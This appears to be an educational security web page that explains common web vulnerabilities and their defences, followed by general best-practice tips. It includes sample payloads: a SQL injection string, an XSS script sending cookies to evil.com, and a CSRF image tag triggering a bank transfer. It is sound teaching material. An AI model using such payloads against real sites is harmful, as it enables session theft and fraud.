Vulnerability Library

Learn how the most dangerous vulnerabilities work and how to defend against them. Click any card to expand details.

Critical

SQL Injection

Attackers inject malicious SQL into input fields to manipulate database queries.

How it works: User input is passed directly into a SQL query without sanitisation.

' OR '1'='1'; --

Defence: Use parameterised queries, prepared statements, and an ORM. Never concatenate raw input into SQL strings.

Critical

Cross-Site Scripting (XSS)

Injecting malicious scripts into web pages viewed by other users.

How it works: Unsanitised user input is rendered as HTML/JS in the browser.

<script>document.location='https://evil.com?c='+document.cookie</script>

Defence: Encode output, implement a strict Content Security Policy (CSP), and use modern frameworks that auto-escape.

High

Cross-Site Request Forgery

Tricking authenticated users into unknowingly sending malicious requests.

How it works: The attacker crafts a request that uses the victim's active session credentials.

<img src="https://bank.com/transfer?to=attacker&amount=1000">

Defence: Use anti-CSRF tokens, SameSite cookies, and verify the Origin/Referer headers.

High

Broken Authentication

Weak session management, credential stuffing, and insecure login flows.

How it works: Attackers exploit weak passwords, leaked credentials, or session tokens to take over accounts.

Defence: Enforce MFA, rate-limit login attempts, use secure session tokens, and hash passwords with bcrypt/Argon2.

Medium

Sensitive Data Exposure

Unencrypted transmission or storage of sensitive data like passwords and PII.

How it works: Data is sent over HTTP, stored in plaintext logs, or cached in browsers without protection.

Defence: Enforce HTTPS everywhere, encrypt data at rest, and avoid logging sensitive fields.

Medium

Security Misconfiguration

Default credentials, open cloud buckets, and verbose error messages.

How it works: Systems left with default settings expose unnecessary attack surface — admin panels, debug endpoints, or public S3 buckets.

Defence: Harden configurations, disable default accounts, restrict access, and run automated config audits.

Security Best Practices

Actionable steps to strengthen your security posture at every layer.

🔑

Use a Password Manager

Generate and store unique, complex passwords for every account. Never reuse passwords across services.

📱

Enable Multi-Factor Authentication

MFA blocks 99.9% of automated account-takeover attacks. Use an authenticator app, not SMS where avoidable.

🔄

Keep Software Updated

Unpatched software is the leading attack vector. Enable automatic updates for your OS, browser, and apps.

🕵️

Verify Before You Click

Hover over links before clicking. Check sender addresses carefully. Legitimate services never ask for credentials via email.

🌐

Use a VPN on Public Wi-Fi

Public networks are hunting grounds for attackers. A VPN encrypts your traffic and hides your identity.

💾

Back Up Your Data

Follow the 3-2-1 rule: 3 copies, 2 different media types, 1 off-site. Your backup is your last line of defence against ransomware.

🔒

Encrypt Sensitive Files

Use tools like VeraCrypt or BitLocker to encrypt drives. If a device is stolen, encrypted data stays protected.

🧹

Minimise Your Attack Surface

Disable unused services, close open ports, and remove software you no longer need. Less exposure = less risk.
